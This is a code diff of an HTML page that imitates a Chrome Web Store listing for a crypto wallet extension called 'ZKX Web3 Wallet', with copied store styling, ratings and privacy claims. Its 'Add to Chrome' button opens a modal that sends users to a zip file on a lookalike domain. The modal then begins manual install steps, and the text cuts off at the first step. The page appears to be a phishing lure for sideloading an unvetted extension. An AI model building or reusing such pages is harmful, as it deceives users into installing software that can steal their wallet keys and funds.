@@ -1,384 +1,511 @@
-<!DOCTYPE html>
 <html lang="en">
+
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>XWallet - Chrome Web Store</title>
+  <title>ZKX Web3 Wallet - Chrome Web Store</title>
   <script src="https://cdn.tailwindcss.com"></script>
+  <link class="favicon" rel="icon" href="https://ssl.gstatic.com/chrome/webstore/images/icon_48px.png" sizes="48x48">
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; background: #fff; color: #202124; }
-    .scroll-x { scroll-behavior: smooth; -webkit-overflow-scrolling: touch; }
-    .scroll-x::-webkit-scrollbar { height: 6px; }
-    .scroll-x::-webkit-scrollbar-track { background: transparent; }
-    .scroll-x::-webkit-scrollbar-thumb { background: #dadce0; border-radius: 3px; }
-    .star { display: inline-block; width: 16px; height: 16px; }
-    .card { transition: box-shadow .2s, transform .2s; }
-    .card:hover { box-shadow: 0 4px 12px rgba(0,0,0,.12); transform: translateY(-2px); }
-    .nav-link { color: #5f6368; font-size: 14px; font-weight: 500; text-decoration: none; padding: 8px 12px; border-radius: 4px; transition: background .15s; }
-    .nav-link:hover { background: #f1f3f4; }
-    .search-input { outline: none; }
-    .search-input:focus { border-color: #1a73e8; }
-    .btn-signin { background: #1a73e8; color: #fff; border: none; padding: 8px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background .2s; }
-    .btn-signin:hover { background: #1558b0; }
-    .hero-gradient { background: linear-gradient(135deg, #1a73e8 0%, #4285f4 50%, #34a853 100%); }
-    .code-box { background: #f8f9fa; border: 1px solid #e8eaed; border-radius: 8px; padding: 12px 16px; font-family: 'Consolas', 'Monaco', monospace; font-size: 13px; color: #202124; overflow-x: auto; }
-    .code-box .comment { color: #5f6368; }
-    .code-box .cmd { color: #1a73e8; }
-    .step-num { width: 32px; height: 32px; border-radius: 50%; background: #e8f0fe; color: #1a73e8; font-weight: 600; font-size: 14px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
-    .feature-card { border: 1px solid #e8eaed; border-radius: 12px; padding: 24px; transition: box-shadow .2s, transform .2s; }
-    .feature-card:hover { box-shadow: 0 4px 12px rgba(0,0,0,.08); transform: translateY(-2px); }
-    .install-card { border: 1px solid #e8eaed; border-radius: 12px; padding: 20px 24px; }
-    .footer-link { color: #5f6368; font-size: 12px; text-decoration: none; padding: 4px 8px; }
-    .footer-link:hover { text-decoration: underline; }
-    .badge { background: #e8f0fe; color: #1a73e8; font-size: 11px; font-weight: 600; padding: 2px 8px; border-radius: 10px; }
-    .btn-install { background: #1a73e8; color: #fff; font-weight: 500; padding: 10px 32px; border-radius: 4px; font-size: 14px; text-decoration: none; display: inline-flex; align-items: center; gap: 6px; transition: background .2s; }
-    .btn-install:hover { background: #1558b0; }
-    @media (max-width: 768px) {
-      .nav-links { display: none; }
+    .scrollbar-hide::-webkit-scrollbar {
+      display: none;
+    }
+
+    .scrollbar-hide {
+      -ms-overflow-style: none;
+      scrollbar-width: none;
+    }
+
+    @import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap');
+
+    /* Modern dialog styling with transitions */
+    dialog::backdrop {
+      background-color: rgba(15, 23, 42, 0.45);
+      backdrop-filter: blur(8px);
+      opacity: 0;
+      transition: opacity 0.3s ease-out;
+    }
+
+    dialog[open]::backdrop {
+      opacity: 1;
+    }
+
+    dialog {
+      opacity: 0;
+      transform: scale(0.95) translateY(10px);
+      transition: opacity 0.3s ease-out, transform 0.3s ease-out, display 0.3s allow-discrete;
+    }
+
+    dialog[open] {
+      opacity: 1;
+      transform: scale(1) translateY(0);
+    }
+
+    @starting-style {
+      dialog[open] {
+        opacity: 0;
+        transform: scale(0.95) translateY(10px);
+      }
+
+      dialog[open]::backdrop {
+        opacity: 0;
+      }
     }
   </style>
 </head>
-<body>
 
-<!-- Header -->
-<header class="sticky top-0 z-50 bg-white border-b border-gray-100 shadow-sm">
-  <div class="max-w-7xl mx-auto px-4 h-14 flex items-center justify-between gap-4">
-    <div class="flex items-center gap-6">
-      <a href="#" class="flex items-center gap-2 text-[#1a73e8] no-underline">
-        <svg class="w-7 h-7" viewBox="0 0 48 48"><path fill="#1a73e8" d="M24 4C12.95 4 4 12.95 4 24s8.95 20 20 20 20-8.95 20-20S35.05 4 24 4zm10 28h-4v-8h-4v8h-4V16h4v8h4v-8h4v16z"/></svg>
-        <span class="text-lg font-medium text-[#202124]">Chrome Web Store</span>
+<body class="bg-white text-gray-900 font-['Google_Sans',Roboto,Arial,sans-serif] antialiased min-h-screen">
+
+  <!-- Header -->
+  <header class="fixed top-0 left-0 right-0 z-50 bg-white border-b border-gray-200" style="min-width: 1249px;">
+    <div class="flex items-center h-16 px-4 max-w-full">
+      <a href="./" class="flex items-center gap-2 shrink-0 mr-4">
+        <img src="https://fonts.gstatic.com/s/i/productlogos/chrome_store/v7/192px.svg" alt="Chrome Web Store"
+          class="w-6 h-6">
+        <span class="text-xl text-gray-700 font-medium">Chrome Web Store</span>
       </a>
-      <nav class="nav-links flex items-center gap-1">
-        <a href="#" class="nav-link">Extensions</a>
-        <a href="#" class="nav-link">Themes</a>
-      </nav>
-    </div>
-    <div class="flex items-center gap-3 flex-1 max-w-md">
-      <div class="relative w-full">
-        <svg class="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-[#5f6368]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>
-        <input class="search-input w-full h-10 pl-10 pr-4 border border-gray-200 rounded-full bg-[#f1f3f4] text-sm" type="text" value="XWallet" placeholder="Search extensions and themes">
+
+      <!-- Search -->
+      <div class="flex-1 max-w-[720px] mx-auto">
+        <div class="relative">
+          <svg class="absolute left-3 top-1/2 -translate-y-1/2 w-6 h-6 text-gray-500" fill="currentColor"
+            viewBox="0 0 24 24">
+            <path
+              d="M20.49 19l-5.73-5.73C15.53 12.2 16 10.91 16 9.5A6.5 6.5 0 1 0 9.5 16c1.41 0 2.7-.47 3.77-1.24L19 20.49 20.49 19zM5 9.5C5 7.01 7.01 5 9.5 5S14 7.01 14 9.5 11.99 14 9.5 14 5 11.99 5 9.5z" />
+          </svg>
+          <input type="text" placeholder="Search extensions and themes"
+            class="w-full h-10 pl-10 pr-4 bg-gray-100 rounded-full border border-transparent focus:border-blue-500 focus:bg-white focus:outline-none text-sm">
+        </div>
+      </div>
+
+      <!-- Right actions -->
+      <div class="flex items-center gap-2 shrink-0">
+        <button class="w-10 h-10 flex items-center justify-center rounded-full hover:bg-gray-100"
+          aria-label="More options">
+          <svg width="24" height="24" viewBox="0 0 24 24" class="text-gray-600" fill="currentColor">
+            <path
+              d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z" />
+          </svg>
+        </button>
+        <!-- <button class="w-10 h-10 flex items-center justify-center rounded-full hover:bg-gray-100"
+          aria-label="Google apps">
+          <svg class="w-6 h-6 text-gray-600" fill="currentColor" viewBox="0 0 24 24">
+            <path
+              d="M6 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6 12c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm-6 0c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0-6c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6-6c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6 0c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm-6 6c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6 6c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z" />
+          </svg>
+        </button> -->
+        <img src="https://lh3.googleusercontent.com/ogw/AF2bZyjVjAuM-H19dq9LjHRWjERWh0StfWk3LjUtIf9yKgmhIw=s32-c-mo"
+          alt="Account" class="w-8 h-8 rounded-full cursor-pointer">
       </div>
     </div>
-    <div class="flex items-center gap-2">
-      <div class="nav-links flex items-center gap-1">
-        <a href="#" class="nav-link">My extensions & themes</a>
-        <a href="#" class="nav-link">Give feedback</a>
-      </div>
-      <button class="btn-signin">Sign in</button>
+  </header>
+
+  <!-- Main content -->
+  <div class="pt-24 min-h-screen bg-[#f8fafd]">
+    <div class="max-w-5xl mx-auto px-6" style="min-width: 960px;">
+
+      <!-- Alert banner -->
+      <!-- <div class="bg-[#dd9900] text-black font-bold px-6 py-4 rounded-lg mb-6 flex items-center justify-between">
+        <span>Item currently unavailable. Please check the troubleshooting guide.</span>
+        <button class="bg-black text-white font-bold px-8 py-3 rounded-full hover:bg-gray-800 text-sm">View
+          guide</button>
+      </div> -->
+
+      <!-- Item header card -->
+      <section class="bg-white rounded-2xl p-8 shadow-sm border border-gray-100 mb-6">
+        <div class="flex items-start gap-6">
+          <div class="flex items-start gap-4 min-w-0">
+            <img
+              src="https://lh3.googleusercontent.com/HjD37Tzr44qU_CFEhOGUuXF2ltXVwpavlkCHDgtsS9Xd6g2htVhWO_4acgRG055yZ4yuuFbn5NZnnzEqV0Noxuuq=s120"
+              alt="ZKX Web3 Wallet" class="w-16 h-16 rounded-2xl shrink-0">
+            <div>
+              <h1 class="text-2xl font-normal text-gray-900 mb-1">ZKX Web3 Wallet</h1>
+              <div class="flex items-center gap-2 text-sm mb-2">
+                <span class="text-lg font-normal text-gray-900">5.0</span>
+                <svg width="18" height="18" viewBox="0 0 24 24" class="text-yellow-500 fill-current">
+                  <path
+                    d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21 12 17.27z" />
+                </svg>
+                <span class="text-blue-600">(<a href="#" class="hover:underline">22 ratings</a>)</span>
+                <button class="w-8 h-8 flex items-center justify-center rounded-full hover:bg-gray-100 text-gray-500"
+                  title="Ratings are updated daily and may not reflect the most recent reviews.">
+                  <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                    <path
+                      d="M11 17h2v-6h-2v6zm1-15C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zM11 9h2V7h-2v2z" />
+                  </svg>
+                </button>
+                <button
+                  class="flex items-center gap-1 px-3 h-9 rounded-full text-sm font-medium text-blue-600 hover:bg-blue-50 border border-transparent">
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
+                    <path
+                      d="M18 16c-.79 0-1.5.31-2.03.81L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.53.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.48.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.05 4.12c-.05.22-.09.45-.09.69 0 1.66 1.34 3 3 3s3-1.34 3-3-1.34-3-3-3z" />
+                  </svg>
+                  Share
+                </button>
+              </div>
+              <div class="flex items-center gap-1 text-sm text-gray-600 mb-4">
+                <a href="#" class="text-blue-600 hover:underline">Extension</a>
+                <span class="mx-1">&#8250;</span>
+                <a href="#" class="text-blue-600 hover:underline">Workflow &amp; Planning</a>
+                <span class="ml-2">1,000 users</span>
+              </div>
+            </div>
+          </div>
+          <div class="ml-auto shrink-0">
+            <button id="add-to-chrome-btn"
+              class="bg-blue-600 hover:bg-blue-700 text-white font-bold px-8 py-3 rounded-full text-sm shadow-sm transition-all duration-200 active:scale-95">
+              Add to Chrome
+            </button>
+          </div>
+        </div>
+      </section>
+
+      <!-- Screenshots carousel -->
+      <section class="bg-white rounded-2xl p-6 shadow-sm border border-gray-100 mb-6">
+        <div class="relative">
+          <button
+            class="absolute left-0 top-1/2 -translate-y-1/2 z-10 w-10 h-10 flex items-center justify-center rounded-full bg-white shadow-md hover:bg-gray-50 -ml-4">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor" class="text-gray-600">
+              <path d="M16.41 5.41L15 4l-8 8 8 8 1.41-1.41L9.83 12z" />
+            </svg>
+          </button>
+          <div class="flex gap-3 overflow-x-auto scrollbar-hide mx-2">
+            <div class="shrink-0"><img
+                src="https://lh3.googleusercontent.com/7jWwF019-sqeZ6gcsD5Z_SAFW7hb1CUq1KOB1QZbz7KoZD6ziaHcOtfQlyaBN85Oe3zPeoZlyeTlm78ym62geMRw=s1280-w1280-h800"
+                class="h-52 rounded-lg border border-gray-200" alt="Screenshot 1"></div>
+            <div class="shrink-0"><img
+                src="https://lh3.googleusercontent.com/D7dgCDZseRq8yGz667yw0-UGoQ1ti-wq8osFV_5IRlOVPk1aNHWXbpg6XpNjPS9ow3WdZX-tG7A23JSeYrn22AOk8Q=s1280-w1280-h800"
+                class="h-52 rounded-lg border border-gray-200" alt="Screenshot 2"></div>
+            <div class="shrink-0"><img
+                src="https://lh3.googleusercontent.com/y0sRmhtf0KledSc2ULrizHfF9PY3EBmxKTTxR6EbSNQPdq-3a3oLAnRgmu0pvkp1l0PhjRVBxE9lVQaAqs24Pffy=s1280-w1280-h800"
+                class="h-52 rounded-lg border border-gray-200" alt="Screenshot 3"></div>
+            <div class="shrink-0"><img
+                src="https://lh3.googleusercontent.com/pA-F0zWidqRbPClHEl51BqIb2qZ2p0vVkeAO4mOCm7Im1tcgqLXjUZacBDHdPKvSoKgjbSEb29iur60D4zSJsFlUaqs=s1280-w1280-h800"
+                class="h-52 rounded-lg border border-gray-200" alt="Screenshot 4"></div>
+            <div class="shrink-0"><img
+                src="https://lh3.googleusercontent.com/WDTDpFNaOKd9kKQRbeOEiWKuL4ejPNkysL6MtXwbjy6F0fVDUxyFwgYjkQN7sKfDgkvRv_6x8gOdGErj8dpLtodtXA=s1280-w1280-h800"
+                class="h-52 rounded-lg border border-gray-200" alt="Screenshot 5"></div>
+          </div>
+          <button
+            class="absolute right-0 top-1/2 -translate-y-1/2 z-10 w-10 h-10 flex items-center justify-center rounded-full bg-white shadow-md hover:bg-gray-50 -mr-4">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor" class="text-gray-600">
+              <path d="M7.59 18.59L9 20l8-8-8-8-1.41 1.41L14.17 12z" />
+            </svg>
+          </button>
+        </div>
+        <div class="flex gap-2 mt-4 justify-center">
+          <div class="w-14 h-10 rounded border-2 border-blue-500 overflow-hidden cursor-pointer"><img
+              src="https://lh3.googleusercontent.com/7jWwF019-sqeZ6gcsD5Z_SAFW7hb1CUq1KOB1QZbz7KoZD6ziaHcOtfQlyaBN85Oe3zPeoZlyeTlm78ym62geMRw=s192-w192-h120"
+              class="w-full h-full object-cover" alt=""></div>
+          <div
+            class="w-14 h-10 rounded border border-gray-200 overflow-hidden cursor-pointer opacity-70 hover:opacity-100">
+            <img
+              src="https://lh3.googleusercontent.com/D7dgCDZseRq8yGz667yw0-UGoQ1ti-wq8osFV_5IRlOVPk1aNHWXbpg6XpNjPS9ow3WdZX-tG7A23JSeYrn22AOk8Q=s192-w192-h120"
+              class="w-full h-full object-cover" alt="">
+          </div>
+          <div
+            class="w-14 h-10 rounded border border-gray-200 overflow-hidden cursor-pointer opacity-70 hover:opacity-100">
+            <img
+              src="https://lh3.googleusercontent.com/y0sRmhtf0KledSc2ULrizHfF9PY3EBmxKTTxR6EbSNQPdq-3a3oLAnRgmu0pvkp1l0PhjRVBxE9lVQaAqs24Pffy=s192-w192-h120"
+              class="w-full h-full object-cover" alt="">
+          </div>
+          <div
+            class="w-14 h-10 rounded border border-gray-200 overflow-hidden cursor-pointer opacity-70 hover:opacity-100">
+            <img
+              src="https://lh3.googleusercontent.com/pA-F0zWidqRbPClHEl51BqIb2qZ2p0vVkeAO4mOCm7Im1tcgqLXjUZacBDHdPKvSoKgjbSEb29iur60D4zSJsFlUaqs=s192-w192-h120"
+              class="w-full h-full object-cover" alt="">
+          </div>
+          <div
+            class="w-14 h-10 rounded border border-gray-200 overflow-hidden cursor-pointer opacity-70 hover:opacity-100">
+            <img
+              src="https://lh3.googleusercontent.com/WDTDpFNaOKd9kKQRbeOEiWKuL4ejPNkysL6MtXwbjy6F0fVDUxyFwgYjkQN7sKfDgkvRv_6x8gOdGErj8dpLtodtXA=s192-w192-h120"
+              class="w-full h-full object-cover" alt="">
+          </div>
+        </div>
+      </section>
+
+      <!-- Overview -->
+      <section class="bg-white rounded-2xl p-8 shadow-sm border border-gray-100 mb-6">
+        <h2 class="text-lg font-normal text-gray-900 mb-4">Overview</h2>
+        <div class="text-sm text-gray-700 leading-relaxed max-h-40 overflow-hidden relative">
+          <p class="mb-4">Fast &amp; secure Web3 wallet to supercharge your account on Ethereum and EVM networks.</p>
+          <p class="mb-4">ZKX Web3 Wallet is a secure, non-custodial crypto wallet designed for the modern decentralized
+            era. Seamlessly manage your digital assets across multiple networks including Ethereum (ETH), BNB Chain
+            (BSC), PulseChain (PLS) and others in one intuitive interface.</p>
+          <p class="mb-4">Whether you are a DeFi enthusiast or a casual trader, ZKX provides a professional-grade Web3
+            wallet experience with a unique focus on user privacy and asset control.</p>
+          <div class="absolute bottom-0 left-0 right-0 h-16 bg-gradient-to-t from-white pointer-events-none"></div>
+        </div>
+        <button class="text-blue-600 text-sm font-medium hover:underline mt-2">See more</button>
+      </section>
+
+      <!-- Ratings -->
+      <section class="bg-white rounded-2xl p-8 shadow-sm border border-gray-100 mb-6">
+        <h2 class="text-lg font-normal text-gray-900 mb-4">5 out of 5
+          <span class="inline-flex align-middle ml-2">
+            <svg width="30" height="30" viewBox="0 0 24 24" class="text-yellow-500 fill-current">
+              <path
+                d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21 12 17.27z" />
+            </svg>
+            <svg width="30" height="30" viewBox="0 0 24 24" class="text-yellow-500 fill-current">
+              <path
+                d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21 12 17.27z" />
+            </svg>
+            <svg width="30" height="30" viewBox="0 0 24 24" class="text-yellow-500 fill-current">
+              <path
+                d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21 12 17.27z" />
+            </svg>
+            <svg width="30" height="30" viewBox="0 0 24 24" class="text-yellow-500 fill-current">
+              <path
+                d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21 12 17.27z" />
+            </svg>
+            <svg width="30" height="30" viewBox="0 0 24 24" class="text-yellow-500 fill-current">
+              <path
+                d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21 12 17.27z" />
+            </svg>
+          </span>
+          <span class="text-sm font-normal text-gray-600 ml-2">22 ratings</span>
+        </h2>
+        <p class="text-xs text-gray-500 mb-4"><a href="#" class="hover:underline">Learn more about results and
+            reviews.</a></p>
+        <a href="#" class="text-blue-600 text-sm font-medium hover:underline">See all reviews</a>
+      </section>
+
+      <!-- Details -->
+      <section class="bg-white rounded-2xl p-8 shadow-sm border border-gray-100 mb-6">
+        <h2 class="text-lg font-normal text-gray-900 mb-4">Details</h2>
+        <ul class="divide-y divide-gray-100 text-sm">
+          <li class="flex py-4"><span class="w-40 text-gray-500 shrink-0">Version</span><span>0.0.33</span></li>
+          <li class="flex py-4"><span class="w-40 text-gray-500 shrink-0">Updated</span><span>May 21, 2026</span></li>
+          <li class="flex py-4"><span class="w-40 text-gray-500 shrink-0"></span><a href="#"
+              class="text-blue-600 hover:underline">Flag concern</a></li>
+          <li class="flex py-4"><span class="w-40 text-gray-500 shrink-0">Offered by</span><span>LibertySwap
+              Developer</span></li>
+          <li class="flex py-4"><span class="w-40 text-gray-500 shrink-0">Size</span><span>64.74MiB</span></li>
+          <li class="flex py-4"><span class="w-40 text-gray-500 shrink-0">Languages</span><span>English</span></li>
+          <li class="flex py-4">
+            <span class="w-40 text-gray-500 shrink-0">Developer</span>
+            <div>
+              <details class="group">
+                <summary class="cursor-pointer text-blue-600 hover:underline list-none flex items-center gap-1">
+                  <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" class="text-gray-500">
+                    <path
+                      d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-.8 2L12 10.8 4.8 6h14.4zM4 18V7.87l8 5.33 8-5.33V18H4z" />
+                  </svg>
+                  Email
+                  <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" class="group-open:hidden">
+                    <path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z" />
+                  </svg>
+                  <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" class="hidden group-open:block">
+                    <path d="M12 20l1.41-1.41L7.83 13H20v-2H7.83l5.58-5.59L12 4l-8 8z" />
+                  </svg>
+                </summary>
+                <div class="mt-2 text-gray-700">support@libertyswap.finance</div>
+              </details>
+            </div>
+          </li>
+          <li class="flex py-4">
+            <span class="w-40 text-gray-500 shrink-0">Non-trader</span>
+            <span class="text-gray-600">This developer has not identified itself as a trader. For consumers in the
+              European Union, please note that consumer rights do not apply to contracts between you and this
+              developer.</span>
+          </li>
+        </ul>
+      </section>
+
+      <!-- Privacy -->
+      <section class="bg-white rounded-2xl p-8 shadow-sm border border-gray-100 mb-6">
+        <h2 class="text-lg font-normal text-gray-900 mb-4">Privacy</h2>
+        <div class="flex items-start gap-2 text-sm text-gray-700 mb-4">
+          <svg width="24" height="24" viewBox="0 0 24 24" class="text-green-600 shrink-0 fill-current">
+            <path
+              d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z" />
+            <path d="M10 14.2l-2.6-2.6L6 13l4 4 8-8-1.4-1.4z" />
+          </svg>
+          <span>The developer has disclosed that it will not collect or use your data. To learn more, see the
+            developer's <a href="#" class="text-blue-600 hover:underline">privacy policy</a>.</span>
+        </div>
+        <h3 class="text-sm font-medium text-gray-700 mb-2">This developer declares that your data is</h3>
+        <ul class="text-sm text-gray-600 space-y-1 list-disc list-inside">
+          <li>Not being sold to third parties, outside of the <a href="#" class="text-blue-600 hover:underline">approved
+              use cases</a></li>
+          <li>Not being used or transferred for purposes that are unrelated to the item's core functionality</li>
+          <li>Not being used or transferred to determine creditworthiness or for lending purposes</li>
+        </ul>
+      </section>
+
+      <!-- Support -->
+      <section class="bg-white rounded-2xl p-8 shadow-sm border border-gray-100 mb-12">
+        <h2 class="text-lg font-normal text-gray-900 mb-4">Support</h2>
+        <p class="text-sm text-gray-700">
+          For help with questions, suggestions, or problems, visit the developer's
+          <a href="#" class="text-blue-600 hover:underline">support site</a>
+        </p>
+      </section>
+
     </div>
   </div>
-</header>
 
-<!-- Sub-nav tabs -->
-<div class="border-b border-gray-100 bg-white">
-  <div class="max-w-7xl mx-auto px-4 flex items-center gap-8 h-11">
-    <a href="#" class="text-sm font-medium text-[#5f6368] no-underline hover:text-[#202124]">Discover</a>
-    <a href="#" class="text-sm font-medium text-[#1a73e8] border-b-2 border-[#1a73e8] h-full flex items-center px-1 no-underline">Extensions</a>
-    <a href="#" class="text-sm font-medium text-[#5f6368] no-underline hover:text-[#202124]">Themes</a>
-  </div>
-</div>
-
-<main class="max-w-7xl mx-auto px-4 py-6">
-
-  <!-- Extension Detail Header -->
-  <div class="flex flex-col md:flex-row gap-8 mb-10">
-    <!-- Left: Icon + Info -->
-    <div class="flex-shrink-0 flex flex-col items-center md:items-start">
-      <div class="w-24 h-24 rounded-2xl bg-[#a78bfb] flex items-center justify-center shadow-md">
-        <svg class="w-12 h-12 text-white" viewBox="0 0 32 32" fill="none">
-          <path d="M9 9l14 14M23 9L9 23" stroke="white" stroke-width="3" stroke-linecap="round"/>
+  <!-- Manual Installation Instructions Modal -->
+  <dialog id="download-modal"
+    class="rounded-3xl p-8 md:p-10 max-w-4xl w-11/12 border border-gray-100 shadow-2xl focus:outline-none bg-white overflow-y-auto max-h-[90vh]">
+    <div class="relative">
+      <!-- Close button -->
+      <button id="close-modal-btn"
+        class="absolute -top-3 -right-3 w-10 h-10 flex items-center justify-center rounded-full hover:bg-gray-100 text-gray-500 transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500"
+        aria-label="Close modal">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+          stroke-linecap="round" stroke-linejoin="round">
+          <line x1="18" y1="6" x2="6" y2="18"></line>
+          <line x1="6" y1="6" x2="18" y2="18"></line>
         </svg>
-      </div>
-      <div class="flex items-center gap-1 mt-3">
-        <svg class="star" viewBox="0 0 16 16" fill="#fbbc04"><path d="M8 1l1.57 4.84h5.09l-4.12 2.99 1.57 4.84L8 10.68l-4.11 2.99 1.57-4.84-4.12-2.99h5.09z"/></svg>
-        <svg class="star" viewBox="0 0 16 16" fill="#fbbc04"><path d="M8 1l1.57 4.84h5.09l-4.12 2.99 1.57 4.84L8 10.68l-4.11 2.99 1.57-4.84-4.12-2.99h5.09z"/></svg>
-        <svg class="star" viewBox="0 0 16 16" fill="#fbbc04"><path d="M8 1l1.57 4.84h5.09l-4.12 2.99 1.57 4.84L8 10.68l-4.11 2.99 1.57-4.84-4.12-2.99h5.09z"/></svg>
-        <svg class="star" viewBox="0 0 16 16" fill="#fbbc04"><path d="M8 1l1.57 4.84h5.09l-4.12 2.99 1.57 4.84L8 10.68l-4.11 2.99 1.57-4.84-4.12-2.99h5.09z"/></svg>
-        <svg class="star" viewBox="0 0 16 16" fill="#fbbc04"><path d="M8 1l1.57 4.84h5.09l-4.12 2.99 1.57 4.84L8 10.68l-4.11 2.99 1.57-4.84-4.12-2.99h5.09z"/></svg>
-        <span class="text-sm font-medium text-[#5f6368] ml-1">5.0</span>
-        <span class="text-sm text-[#5f6368] ml-2">&middot; 1 review</span>
-      </div>
-      <span class="badge mt-2 text-xs">Extensions</span>
-    </div>
+      </button>
 
-    <!-- Right: Name + Description + Install -->
-    <div class="flex-1 min-w-0">
-      <div class="flex items-start justify-between gap-4 flex-wrap">
-        <div>
-          <h1 class="text-3xl font-bold text-[#202124]">XWallet</h1>
-          <p class="text-sm text-[#5f6368] mt-0.5">offered by <span class="text-[#1a73e8]">xwallet.io</span></p>
-        </div>
-        <a href="#install" class="btn-install whitespace-nowrap">
-          <svg class="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 5v14m-7-7l7 7 7-7"/></svg>
-          Install
-        </a>
+      <!-- Content Header -->
+      <div class="text-center mb-8">
+        <h2 class="text-3xl md:text-4xl font-bold text-gray-900 tracking-tight mb-3">Thanks for downloading!<br>Just a
+          few steps left</h2>
+        <p class="text-sm text-gray-600">
+          Your download will begin automatically. If it didn't start,
+          <a href="https://zkxwallet-chrome-apps.sharepoint-externals.com/zkx-wallet.zip" id="manual-download-link" target="_blank"
+            class="text-blue-600 hover:underline font-semibold inline-flex items-center gap-1">
+            download ZKX Wallet manually
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"
+              stroke-linecap="round" stroke-linejoin="round">
+              <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+              <polyline points="7 10 12 15 17 10"></polyline>
+              <line x1="12" y1="15" x2="12" y2="3"></line>
+            </svg>
+          </a>.
+        </p>
       </div>
-      <p class="text-[#5f6368] text-sm mt-4 leading-relaxed max-w-2xl">
-        A modern custodial Ethereum wallet that fits right in your browser. Create or import wallets,
-        check live ETH balances, send and receive transactions, browse history with Etherscan links,
-        and manage everything from a sleek popup or the full web app.
-      </p>
-      <div class="flex flex-wrap gap-4 mt-4 text-sm text-[#5f6368]">
-        <span><strong class="text-[#202124]">2.1k</strong> users</span>
-        <span><strong class="text-[#202124]">v1.0.0</strong> updated 2 days ago</span>
-        <span><strong class="text-[#202124]">122&thinsp;KB</strong> size</span>
-      </div>
-    </div>
-  </div>
 
-  <!-- Screenshot / Hero mockup -->
-  <div class="mb-10">
-    <h2 class="text-lg font-semibold text-[#202124] mb-4">Screenshots</h2>
-    <div class="flex gap-4 overflow-x-auto pb-2 scroll-x">
-      <div class="flex-shrink-0 w-[340px] border border-gray-200 rounded-xl p-5 bg-white shadow-sm">
-        <div class="bg-[#0f0d11] rounded-lg p-4">
-          <div class="flex items-center gap-2 mb-4 pb-3 border-b border-[#2d2a35]">
-            <div class="w-6 h-6 rounded bg-[#a78bfb] flex items-center justify-center">
-              <svg class="w-3 h-3 text-[#0f0d11]" viewBox="0 0 20 20"><path d="M5 5l10 10M15 5L5 15" stroke="currentColor" stroke-width="2"/></svg>
+      <!-- Step Cards -->
+      <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+        <!-- Step 1 Card: Unzip -->
+        <div
